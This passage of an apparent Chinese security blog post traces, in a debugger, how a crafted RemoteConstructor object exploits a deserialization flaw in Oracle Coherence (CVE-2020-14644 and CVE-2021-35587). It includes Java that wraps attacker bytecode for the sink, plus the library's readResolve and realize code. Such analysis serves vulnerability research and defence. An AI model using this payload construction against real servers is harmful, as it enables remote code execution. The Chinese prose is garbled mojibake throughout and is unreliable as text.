</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            e<span style=color:#f92672>.</span><span style=color:#a6e22e>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> RemoteConstructor <span style=color:#a6e22e>getRemoteConstructor</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>setRemoteConstructor</span><span style=color:#f92672>(</span>RemoteConstructor remoteConstructor<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œçš„test7å¿…é¡»å®ç°Remotableå’ŒSerializableæ¥å£ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><p>è®°ä½è¿™ä¸ª <code>com.tangosol.internal.util.invoke.Remotable</code> æ¥å£ï¼Œåˆ©ç”¨CVE-2020-14644æ—¶å¿…é¡»å®ç°å®ƒï¼Œè€Œåˆ©ç”¨CVE-2021-35587 æ—¶ä¸éœ€è¦å®ç°å®ƒï¼Œè¿™ä¸€ç‚¹å›°æ‰°äº†æˆ‘å¾ˆä¹…ã€‚</p><p><img loading=lazy src=image-20220713114829787.png alt=image-20220713114829787></p><p><img loading=lazy src=image-20220713114749977.png alt=image-20220713114749977></p><h4 id=è°ƒè¯•åˆ†æ-1>è°ƒè¯•åˆ†æ<a hidden class=anchor aria-hidden=true href=#è°ƒè¯•åˆ†æ-1>#</a></h4><h5 id=å¼€å§‹ååºåˆ—åŒ–>å¼€å§‹ååºåˆ—åŒ–<a hidden class=anchor aria-hidden=true href=#å¼€å§‹ååºåˆ—åŒ–>#</a></h5><p><img loading=lazy src=image-20220713120035755.png alt=image-20220713120035755></p><h5 id=æ„å»º-remoteconstructor-å¯¹è±¡>æ„å»º RemoteConstructor å¯¹è±¡<a hidden class=anchor aria-hidden=true href=#æ„å»º-remoteconstructor-å¯¹è±¡>#</a></h5><p>æˆ‘ä»¬è¦æ„å»ºçš„å¯¹è±¡å±äº <code>com.tangosol.internal.util.invoke.RemoteConstructor</code> ç±»å‹ï¼Œæœ‰m_aoArgså’Œm_definitionä¸¤ä¸ªå±æ€§ï¼Œå…¶ä¸­ <code>m_aoArgs</code> æ˜¯ <code>[Ljava/lang/Object</code> ç±»å‹ï¼Œ<code>m_definition</code> æ˜¯ <code>Lcom/tangosol/internal/util/invoke/ClassDefinition</code> ç±»å‹ã€‚</p><p><img loading=lazy src=image-20220713150255877.png alt=image-20220713150255877></p><p>ä»ç±»å®šä¹‰æ¥çœ‹ä¹Ÿç¡®å®å¦‚æ­¤</p><p><img loading=lazy src=image-20220713164629698.png alt=image-20220713164629698></p><p>å®ä¾‹åŒ–ä¸€ä¸ª RemoteConstructor å¯¹è±¡</p><p><img loading=lazy src=image-20220713151023224.png alt=image-20220713151023224></p><p>å¡«å……å±æ€§</p><p><img loading=lazy src=image-20220713151644125.png alt=image-20220713151644125></p><p>è¯»å–å¹¶å¡«å……åŸºæœ¬æ•°æ®ç±»å‹(primitive Data)ï¼Œè¿™ä¸ª RemoteConstructor å¯¹è±¡æ²¡æœ‰ã€‚</p><p>åŸºæœ¬æ•°æ®ç±»å‹æœ‰å…«ç±» ï¼ˆhttps://www.w3schools.com/java/java_data_types.aspï¼‰</p><table><thead><tr><th style=text-align:left>Data Type</th><th style=text-align:left>Size</th><th style=text-align:left>Description</th></tr></thead><tbody><tr><td style=text-align:left><code>byte</code></td><td style=text-align:left>1 byte</td><td style=text-align:left>Stores whole numbers from -128 to 127</td></tr><tr><td style=text-align:left><code>short</code></td><td style=text-align:left>2 bytes</td><td style=text-align:left>Stores whole numbers from -32,768 to 32,767</td></tr><tr><td style=text-align:left><code>int</code></td><td style=text-align:left>4 bytes</td><td style=text-align:left>Stores whole numbers from -2,147,483,648 to 2,147,483,647</td></tr><tr><td style=text-align:left><code>long</code></td><td style=text-align:left>8 bytes</td><td style=text-align:left>Stores whole numbers from -9,223,372,036,854,775,808 to 9,223,372,036,854,775,807</td></tr><tr><td style=text-align:left><code>float</code></td><td style=text-align:left>4 bytes</td><td style=text-align:left>Stores fractional numbers. Sufficient for storing 6 to 7 decimal digits</td></tr><tr><td style=text-align:left><code>double</code></td><td style=text-align:left>8 bytes</td><td style=text-align:left>Stores fractional numbers. Sufficient for storing 15 decimal digits</td></tr><tr><td style=text-align:left><code>boolean</code></td><td style=text-align:left>1 bit</td><td style=text-align:left>Stores true or false values</td></tr><tr><td style=text-align:left><code>char</code></td><td style=text-align:left>2 bytes</td><td style=text-align:left>Stores a single character/letter or ASCII values</td></tr></tbody></table><p><img loading=lazy src=image-20220713152012724.png alt=image-20220713152012724></p><p>æœ‰ä¸¤ä¸ªéåŸºæœ¬æ•°æ®ç±»å‹çš„å¯¹è±¡ï¼Œé€ä¸€ä»æ•°æ®æµä¸­è¯»å–å¹¶ååºåˆ—åŒ–ï¼Œæ”¾åˆ°objValsä¸­</p><p><img loading=lazy src=image-20220713152610326.png alt=image-20220713152610326></p><h5 id=æ„å»ºobjectå¯¹è±¡m_aoargs>æ„å»ºObject[]å¯¹è±¡ï¼ˆm_aoArgsï¼‰<a hidden class=anchor aria-hidden=true href=#æ„å»ºobjectå¯¹è±¡m_aoargs>#</a></h5><p>å±æ€§ä¸€æ˜¯ä¸€ä¸ªObject Array</p><p><img loading=lazy src=image-20220713152919182.png alt=image-20220713152919182></p><h5 id=æ„å»º-classdefinition-å¯¹è±¡m_definition>æ„å»º ClassDefinition å¯¹è±¡ï¼ˆm_definitionï¼‰<a hidden class=anchor aria-hidden=true href=#æ„å»º-classdefinition-å¯¹è±¡m_definition>#</a></h5><p>ååºåˆ—åŒ–å±æ€§äºŒ</p><p><img loading=lazy src=image-20220713153154374.png alt=image-20220713153154374></p><p>æ˜¯ä¸€ä¸ªå¯¹è±¡</p><p><img loading=lazy src=image-20220713153237552.png alt=image-20220713153237552></p><p>å…·ä½“æ¥è¯´æ˜¯ä¸€ä¸ª <code>com.tangosol.internal.util.invoke.ClassDefinition</code> ç±»å‹çš„å¯¹è±¡</p><p><img loading=lazy src=image-20220713153456984.png alt=image-20220713153456984></p><p>å®ä¾‹åŒ–ClassDefinitionå¯¹è±¡ï¼Œæœ‰4ä¸ªå±æ€§</p><p><img loading=lazy src=image-20220713153931494.png alt=image-20220713153931494></p><p>å…¶ä¸­ m_id å’Œ m_abClass å¯ä»¥é€šè¿‡åºåˆ—åŒ–æ•°æ®è¿˜åŸ</p><p><img loading=lazy src=image-20220713154041392.png alt=image-20220713154041392></p><p>å¡«å…… ClassDefinition å¯¹è±¡</p><p><img loading=lazy src=image-20220713154832227.png alt=image-20220713154832227></p><p>è¯»å–åŸºæœ¬æ•°æ®ç±»å‹çš„å±æ€§ï¼Œä¹Ÿæ˜¯ç©º</p><p><img loading=lazy src=image-20220713155008243.png alt=image-20220713155008243></p><p>é€ä¸ªè¯»å– ClassDefinition çš„å±æ€§</p><p><img loading=lazy src=image-20220713155242182.png alt=image-20220713155242182></p><h5 id=æ„å»ºbyte-arrayå¯¹è±¡m_abclass>æ„å»ºByte Arrayå¯¹è±¡ï¼ˆm_abClassï¼‰<a hidden class=anchor aria-hidden=true href=#æ„å»ºbyte-arrayå¯¹è±¡m_abclass>#</a></h5><p>m_abClass æ˜¯ä¸€ä¸ª byte Array</p><p><img loading=lazy src=image-20220713155336840.png alt=image-20220713155336840></p><p>è¯»åˆ°çš„æ­£æ˜¯ test7 å¯¹è±¡çš„å­—èŠ‚ç </p><p><img loading=lazy src=image-20220713160241116.png alt=image-20220713160241116></p><h5 id=æ„å»º-classidentity-å¯¹è±¡m_id>æ„å»º ClassIdentity å¯¹è±¡ï¼ˆm_idï¼‰<a hidden class=anchor aria-hidden=true href=#æ„å»º-classidentity-å¯¹è±¡m_id>#</a></h5><p><img loading=lazy src=image-20220713160333779.png alt=image-20220713160333779></p><p>m_id æ˜¯ä¸€ä¸ªObject</p><p><img loading=lazy src=image-20220713160511169.png alt=image-20220713160511169></p><p>å®ä¾‹åŒ–ä¸€ä¸ª <code>com.tangosol.internal.util.invoke.ClassIdentity</code></p><p><img loading=lazy src=image-20220713160641085.png alt=image-20220713160641085></p><p>æœ‰ m_sPackageï¼Œm_sBaseNameï¼Œm_sVersion ä¸‰ä¸ªå±æ€§</p><p><img loading=lazy src=image-20220713160848857.png alt=image-20220713160848857></p><p>å¡«å……å±æ€§</p><p><img loading=lazy src=image-20220713161253225.png alt=image-20220713161253225></p><p><img loading=lazy src=image-20220713161340971.png alt=image-20220713161340971></p><p>æ²¡æœ‰åŸºæœ¬ç±»å‹çš„æ•°æ®</p><p><img loading=lazy src=image-20220713161434561.png alt=image-20220713161434561></p><h5 id=ä¾æ¬¡æ„å»ºm_spackagem_sbasenamem_sversion>ä¾æ¬¡æ„å»ºm_sPackage/m_sBaseName/m_sVersion<a hidden class=anchor aria-hidden=true href=#ä¾æ¬¡æ„å»ºm_spackagem_sbasenamem_sversion>#</a></h5><p><img loading=lazy src=image-20220713161846523.png alt=image-20220713161846523></p><p><img loading=lazy src=image-20220713161912889.png alt=image-20220713161912889></p><p>è¯»åˆ° m_sBaseName ä¸º test7</p><p><img loading=lazy src=image-20220713161949490.png alt=image-20220713161949490></p><p>è¯»åˆ° m_sPackage ä¸º pers/neo</p><p><img loading=lazy src=image-20220713162107210.png alt=image-20220713162107210></p><p>è¯»åˆ°m_sVersion ä¸º B9E9F4911DEBD39E951545194CDAB172</p><p><img loading=lazy src=image-20220713162136409.png alt=image-20220713162136409></p><h5 id=å®Œæˆ--classidentity-å¯¹è±¡m_idå¡«å……>å®Œæˆ ClassIdentity å¯¹è±¡ï¼ˆm_idï¼‰å¡«å……<a hidden class=anchor aria-hidden=true href=#å®Œæˆ--classidentity-å¯¹è±¡m_idå¡«å……>#</a></h5><p><img loading=lazy src=image-20220713162310941.png alt=image-20220713162310941></p><p><img loading=lazy src=image-20220713162510597.png alt=image-20220713162510597></p><p><img loading=lazy src=image-20220713162528068.png alt=image-20220713162528068></p><p>putObjectæ˜¯ä¸€ä¸ªnativeå‡½æ•°</p><p><img loading=lazy src=image-20220713162628018.png alt=image-20220713162628018></p><p>å®Œæˆå¡«å……</p><p><img loading=lazy src=image-20220713162722070.png alt=image-20220713162722070></p><p><img loading=lazy src=image-20220713162855429.png alt=image-20220713162855429></p><p><img loading=lazy src=image-20220713162918917.png alt=image-20220713162918917></p><h5 id=å®Œæˆclassdefinition-å¯¹è±¡m_definitionå¡«å……>å®ŒæˆClassDefinition å¯¹è±¡ï¼ˆm_definitionï¼‰å¡«å……<a hidden class=anchor aria-hidden=true href=#å®Œæˆclassdefinition-å¯¹è±¡m_definitionå¡«å……>#</a></h5><p><img loading=lazy src=image-20220713163233743.png alt=image-20220713163233743></p><p><img loading=lazy src=image-20220713163814769.png alt=image-20220713163814769></p><p>è‡³æ­¤å°±åˆ›å»ºå®Œ RemoteConstructor æ„é€ å‡½æ•°çš„ä¸¤ä¸ªå‚æ•°å¯¹è±¡äº†ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-59-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-59-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-59-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-59-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-59-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-59-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-59-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-59-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>        RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=image-20220713164104511.png alt=image-20220713164104511></p><h5 id=å®Œæˆ-remoteconstructor-å¯¹è±¡å¡«å……>å®Œæˆ RemoteConstructor å¯¹è±¡å¡«å……<a hidden class=anchor aria-hidden=true href=#å®Œæˆ-remoteconstructor-å¯¹è±¡å¡«å……>#</a></h5><p><img loading=lazy src=image-20220713165057268.png alt=image-20220713165057268></p><p><img loading=lazy src=image-20220713172216440.png alt=image-20220713172216440></p><h5 id=readresolve>readResolve<a hidden class=anchor aria-hidden=true href=#readresolve>#</a></h5><p>è‡³æ­¤å·²ç»å®Œæˆäº† RemoteConstructor å¯¹è±¡çš„åˆ›å»ºï¼Œä½†æˆ‘ä»¬çš„æ¶æ„ä»£ç å¹¶æ²¡æœ‰è¢«æ‰§è¡Œã€‚è¿™ä¸ªåä¸ºobjçš„å¯¹è±¡ä¹Ÿä¸ä¼šç›´æ¥è¿”å›ç»™æˆ‘ä»¬ä½¿ç”¨ã€‚</p><p>åœ¨æ–¹æ³• <code>java.io.ObjectInputStream#readOrdinaryObject</code> returnä¹‹å‰ä¼šå…ˆè°ƒç”¨RemoteConstructorç±»çš„readResolveæ–¹æ³•æ¥åˆ›å»ºä¸€ä¸ªå®ä¾‹repï¼Œç»è¿‡ä¸€äº›æ£€æŸ¥ä»¥åå°†repèµ‹å€¼ç»™objï¼Œæœ€ç»ˆæ‰è¿”å›ã€‚</p><p>è¿™äº›æ“ä½œæ®ç§°æ˜¯ä¸ºäº†é˜²æ­¢ååºåˆ—åŒ–åŠ¨ä½œåˆ›å»ºçš„å®ä¾‹å¯¼è‡´å•ä¾‹æ¨¡å¼è¢«ç ´åã€‚</p><blockquote><p><code>readResolve</code> is used for <em>replacing</em> the object read from the stream. The only use I&rsquo;ve ever seen for this is enforcing singletons; when an object is read, replace it with the singleton instance. This ensures that nobody can create another instance by serializing and deserializing the singleton.</p><p>â€”â€”https://stackoverflow.com/a/1168375/15103280</p></blockquote><p>æ­£æ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æˆ‘ä»¬çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œäº†ã€‚</p><p><img loading=lazy src=image-20220713173504658.png alt=image-20220713173504658></p><p>readResolveMethodæ˜¯ <code>com.tangosol.internal.util.invoke.RemoteConstructor.readResolve()</code></p><p><img loading=lazy src=image-20220713184244064.png alt=image-20220713184244064></p><p>çœ‹çœ‹å®ç°</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-60-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-60-27>27</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//com.tangosol.internal.util.invoke.RemoteConstructor
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>public</span> Object <span style=color:#a6e22e>readResolve</span><span style=color:#f92672>()</span> <span style=color:#66d9ef>throws</span> ObjectStreamException <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> T <span style=color:#a6e22e>newInstance</span><span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    RemotableSupport support <span style=color:#f92672>=</span> RemotableSupport<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getClassLoader</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> support<span style=color:#f92672>.</span><span style=color:#a6e22e>realize</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>//com.tangosol.internal.util.invoke.RemotableSupport
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>public</span> <span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> T <span style=color:#a6e22e>realize</span><span style=color:#f92672>(</span>RemoteConstructor<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> constructor<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    ClassDefinition definition <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>registerIfAbsent</span><span style=color:#f92672>(</span>constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefinition</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    Class<span style=color:#f92672>&lt;?</span> <span style=color:#66d9ef>extends</span> Remotable<span style=color:#f92672>&gt;</span> clz <span style=color:#f92672>=</span> definition<span style=color:#f92672>.</span><span style=color:#a6e22e>getRemotableClass</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>clz <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>synchronized</span><span style=color:#f92672>(</span>definition<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            clz <span style=color:#f92672>=</span> definition<span style=color:#f92672>.</span><span style=color:#a6e22e>getRemotableClass</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>clz <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                definition<span style=color:#f92672>.</span><span style=color:#a6e22e>setRemotableClass</span><span style=color:#f92672>(</span><span style=color:#66d9ef>this</span><span style=color:#f92672>.</span><span style=color:#a6e22e>defineClass</span><span style=color:#f92672>(</span>definition<span style=color:#f92672>));</span> <span style=color:#75715e>//æœ€ç»ˆçš„Sinkç‚¹
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    Remotable<span style=color:#f92672>&lt;</span>T<span style=color:#f92672>&gt;</span> instance <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>Remotable<span style=color:#f92672>)</span>definition<span style=color:#f92672>.</span><span style=color:#a6e22e>createInstance</span><span style=color:#f92672>(</span>constructor<span style=color:#f92672>.</span><span style=color:#a6e22e>getArguments</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>    instance<span style=color:#f92672>.</span><span style=color:#a6e22e>setRemoteConstructor</span><span style=color:#f92672>(</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> instance<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=åå°„è°ƒç”¨readresolve>åå°„è°ƒç”¨readResolve<a hidden class=anchor aria-hidden=true href=#åå°„è°ƒç”¨readresolve>#</a></h5><p><img loading=lazy src=image-20220713184804915.png alt=image-20220713184804915></p><p>åå°„è°ƒç”¨objå¯¹è±¡çš„readResolveæ–¹æ³•</p><p><img loading=lazy src=image-20220713184953973.png alt=image-20220713184953973></p><p>è·Ÿå…¥è°ƒç”¨</p><p><img loading=lazy src=image-20220713185148324.png alt=image-20220713185148324></p><p>è°ƒç”¨åˆ°nativeå±‚</p><p><img loading=lazy src=image-20220713185359355.png alt=image-20220713185359355></p><h5 id=sinkç‚¹>sinkç‚¹<a hidden class=anchor aria-hidden=true href=#sinkç‚¹>#</a></h5><p>ç„¶åæ¥åˆ°äº† <code>com.tangosol.internal.util.invoke.RemoteConstructor#readResolve</code></p><p><img loading=lazy src=image-20220713185731806.png alt=image-20220713185731806></p><p>è¿›å…¥åˆ° <code>com.tangosol.internal.util.invoke.RemotableSupport#realize</code></p><p><img loading=lazy src=image-20220713185818104.png alt=image-20220713185818104></p><h5 id=åˆ›å»ºæ¶æ„ç±»defineclass>åˆ›å»ºæ¶æ„ç±»ï¼šdefineClass<a hidden class=anchor aria-hidden=true href=#åˆ›å»ºæ¶æ„ç±»defineclass>#</a></h5><p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬çš„touchæ–‡ä»¶çš„æ“ä½œåœ¨ç¬¬64è¡Œçš„defineClasså¹¶æ²¡æœ‰æ‰§è¡Œï¼Œè™½ç„¶çœ‹èµ·æ¥å¾ˆåƒã€‚</p><p>è¿™ä¸€è¡Œå®é™…ä¸Šåšçš„äº‹æƒ…å°±æ˜¯æ ¹æ®definitionçš„å­—èŠ‚ç åœ¨å†…å­˜ä¸­åˆ›å»ºç±»å®šä¹‰ï¼Œç„¶åé€šè¿‡setRemotableClassç»™m_clzå’Œm_mhCtorèµ‹å€¼ï¼Œè¿˜ä¸æ¶‰åŠå­—èŠ‚ç å¯¹åº”çš„ç±»çš„å®ä¾‹åŒ–å’Œæ„é€ å‡½æ•°çš„æ‰§è¡Œã€‚</p><p>ç¬¬64è¡Œæ‰§è¡Œå‰ï¼š</p><p><img loading=lazy src=image-20220713200544155.png alt=image-20220713200544155></p><p>ç¬¬64è¡Œæ‰§è¡Œåï¼š</p><p><img loading=lazy src=image-20220713200651318.png 